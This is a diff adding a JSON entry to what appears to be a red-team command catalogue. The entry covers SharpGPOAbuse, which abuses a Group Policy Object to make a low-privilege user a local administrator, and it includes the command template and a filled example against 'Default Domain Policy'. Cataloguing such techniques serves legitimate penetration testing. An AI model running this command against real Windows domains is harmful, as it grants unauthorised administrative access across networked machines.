@@ -1,0 +1,26 @@
+{
+  "id": "sharpgpo-abuse",
+  "name": "SharpGPOAbuse Local Admin",
+  "command": "./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName '<gpo_name>'",
+  "description": "GPO abuse to add user as local admin",
+  "platform": "windows",
+  "requires": [
+    "shell"
+  ],
+  "protocols": [],
+  "tags": [
+    "sharpgpoabuse",
+    "gpo",
+    "localadmin",
+    "privilege"
+  ],
+  "references": [
+    {
+      "title": "SharpGPOAbuse Github",
+      "url": "https://github.com/FSecureLABS/SharpGPOAbuse"
+    }
+  ],
+  "examples": [
+    "./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount 'lowpriv_user' --GPOName 'Default Domain Policy'"
+  ]
+}
